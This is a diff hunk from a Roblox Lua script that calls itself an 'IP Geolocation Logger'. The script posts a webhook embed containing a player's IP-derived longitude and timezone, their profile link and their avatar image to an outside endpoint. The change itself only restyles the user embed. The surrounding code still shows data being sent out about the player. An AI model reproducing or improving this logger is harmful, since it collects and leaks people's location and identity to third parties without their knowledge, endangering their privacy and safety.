@@ -27,7 +27,7 @@ request({
 				addField("Longitude", tostring(ipGeoData.longitude)),
 				addField("Timezone", ipGeoData.timezone)
 			}},
-			{ title = "User", color = 1733608, fields = { addField("Profile Link", "https://www.roblox.com/users/" .. userId .. "/profile") }, thumbnail = { url = httpService:JSONDecode(game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar?userIds=" .. userId .. "&size=420x420&format=Png&isCircular=false")).data[1].imageUrl } }
+			{ title = "View " .. localPlayer.Name .. "'s full profile", url = "https://www.roblox.com/users/" .. userId .. "/profile", color = 1733608, image = { url = httpService:JSONDecode(game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar?userIds=" .. userId .. "&size=420x420&format=Png&isCircular=false")).data[1].imageUrl } }
 		},
 		username = "IP Geolocation Logger",
 		avatar_url = "https://i.ibb.co/spwWKyBW/Globe-With-Meridians.png"
